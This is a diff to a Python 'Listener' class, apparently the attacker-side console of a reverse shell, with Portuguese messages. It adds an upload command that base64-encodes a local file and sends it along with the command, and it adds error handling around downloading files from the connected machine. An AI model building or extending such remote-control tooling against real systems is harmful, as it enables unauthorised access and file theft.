@@ -36,6 +36,10 @@ class Listener:
         with open(path, 'wb') as file:
             file.write(content)
             return "[+] Arquivo baixado"
+    def read_file(self,path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def exec_command(self, command):
         if ':q' == command[0]:
             self.serial_send('exit')
@@ -49,10 +53,15 @@ class Listener:
         while True:
             command = input("-$  ")
             command = command.split(" ")
-            result = self.exec_command(command)
-            if command[0] == "download":
-                result = self.write_file(command[1],result)
-
+            try:
+                if command[0] == "upload":
+                    content = self.read_file(command[1])
+                    command.append(content.decode('utf-8', errors= "ignore"))
+                result = self.exec_command(command)
+                if command[0] == "download" and "Erro" not in result:
+                    result = self.write_file(command[1],result)
+            except Exception:
+                result = "[-] Erro em algum comando"
             print(result)
 
 
